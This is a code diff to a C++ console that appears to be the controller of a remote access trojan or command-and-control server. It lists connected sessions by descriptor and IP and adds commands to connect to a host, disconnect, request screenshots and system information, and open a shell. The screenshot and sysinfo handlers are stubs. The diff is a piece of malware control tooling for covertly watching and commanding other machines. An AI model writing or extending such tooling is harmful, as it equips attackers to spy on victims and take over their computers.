@@ -37,10 +37,12 @@ public:
         std::map<int, std::string>::iterator sessions_it;
 
         cout << endl;
-            cout << color.BOLD << "   Descriptor   :      Ip Address  " << color.END << endl;
+        cout << color.BOLD << "   Descriptor   :      Ip Address  " << color.END << endl;
+        
         for(sessions_it=sessions.begin(); sessions_it != sessions.end(); sessions_it++){
             cout << "   " << sessions_it->first << "            :      " <<sessions_it->second << endl;
         }
+
         cout << endl;
     }
     void operateSession(const string input_string){
@@ -58,6 +60,22 @@ public:
             }
         }else{
             cout << color.RED << "~ " << color.END << "Invalid Command!" << endl;
+        }
+    }
+    void disconnectSession(){
+        this->current_address = "";
+        this->current_descriptor = 0;
+    }
+    void screenshotSession(){
+        bool status = this->middle_face->sendData(current_descriptor, "screenshot");
+        if(status){
+
+        }
+    }
+    void sysinfoSession(){
+        bool status = this->middle_face->sendData(current_descriptor, "sysinfo");
+        if(status){
+
         }
     }
     void spawnShell(){
@@ -94,8 +112,14 @@ public:
                 this->inputIf.getServerHelp();
             }else if(this->inputSv.rfind("sessions", 0) == 0){
                 this->listSessions();
-            }else if(this->inputSv.rfind("operate", 0) == 0){
+            }else if(this->inputSv.rfind("connect", 0) == 0){
                 this->operateSession(this->inputSv);
+            }else if(this->inputSv.rfind("disconnect", 0) == 0){
+                this->disconnectSession();
+            }else if(this->inputSv.rfind("screenshot", 0) == 0){
+                this->screenshotSession();
+            }else if(this->inputSv.rfind("sysinfo", 0) == 0){
+                this->sysinfoSession();
             }else if(this->inputSv.rfind("shell", 0) == 0){
                 this->spawnShell();
             }
